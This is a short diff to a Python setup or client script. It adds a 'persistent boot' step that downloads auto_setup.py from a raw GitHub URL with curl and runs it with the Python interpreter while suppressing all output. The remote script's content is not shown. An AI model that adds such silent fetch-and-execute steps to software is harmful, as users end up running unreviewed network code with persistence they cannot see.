@@ -198,6 +198,22 @@ try:
 except Exception as e:
     spinner.fail(f"Error deploying module: {e}")
 
+spinner = Halo(text='Configuring persistent boot...', spinner='dots')
+spinner.start()
+try:
+    auto_setup_path = os.path.join(BASE_DIR, "auto_setup.py")
+    v_cache_setup = int(time.time())
+    URL_SETUP_PY = f"https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/auto_setup.py?v={v_cache_setup}"
+    os.system(f"curl -sL '{URL_SETUP_PY}' -o {auto_setup_path} > /dev/null 2>&1")
+    
+    if os.path.exists(auto_setup_path):
+        subprocess.run([sys.executable, auto_setup_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        spinner.succeed("Persistent boot configured successfully!")
+    else:
+        spinner.fail("Failed to download persistent boot script.")
+except Exception:
+    spinner.fail("Error configuring persistent boot.")
+
 registered_in_db = False
 PING_INTERVAL = 15 
 last_check = 0 
